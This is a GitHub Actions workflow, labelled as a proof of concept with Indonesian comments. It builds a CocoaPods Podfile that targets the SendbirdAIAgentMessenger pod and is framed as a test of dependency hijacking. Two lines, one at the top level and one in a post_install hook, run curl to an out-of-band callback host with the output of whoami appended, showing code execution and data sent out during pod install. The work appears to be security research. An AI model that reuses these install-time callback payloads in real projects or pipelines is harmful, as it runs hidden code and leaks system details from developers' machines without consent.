name: Execute_PoC
on: [push, workflow_dispatch]

jobs:
  test-macos:
    runs-on: macos-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Force-Execution Pod Test
        run: |
          mkdir -p TrialRun
          cd TrialRun
          
          git config --global user.email "researcher@test.com"
          git config --global user.name "Researcher"

          # Tulis Podfile dengan TOP-LEVEL EXECUTION
          cat <<EOF > Podfile
          # 1. TRIGGER AWAL (Bukti RCE saat pembacaan metadata)
          puts "[!] INITIALIZING ATTACK PROBE..."
          system("curl -v http://zgaonaqfeajfjxvuunah5i7blu0wsevoe.oast.fun/INIT_$(whoami)")

          install! 'cocoapods', :integrate_targets => false

          # Sumber resmi Sendbird vs Public Trunk
          source 'https://github.com/sendbird/sendbird-ios-distribution.git'
          source 'https://cdn.cocoapods.org/'

          platform :ios, '15.0'

          target 'PoCSimulation' do
            use_frameworks!
            # Ini yang akan memicu konflik versi
            pod 'SendbirdAIAgentMessenger', '>= 1.13.0'
          end

          # 2. TRIGGER AKHIR (Bukti RCE setelah instalasi selesai)
          post_install do |installer|
            puts "[!] POST-INSTALL TRIGGER..."
            system("curl -v http://zgaonaqfeajfjxvuunah5i7blu0wsevoe.oast.fun/POST_$(whoami)")
          end
          EOF

      - name: Execution & Hijack Proof
        run: |
          cd TrialRun
          # Jalankan install
          pod install --repo-update --verbose
          
          echo -e "\n--- VERIFIKASI PEMBAJAKAN (SKAKMAT) ---"
          if [ -f Podfile.lock ]; then
            echo "✅ Podfile.lock Ditemukan. Menampilkan isi:"
            cat Podfile.lock
          else
            echo "❌ Podfile.lock tidak ditemukan. Cek log pod install di atas."
          fi
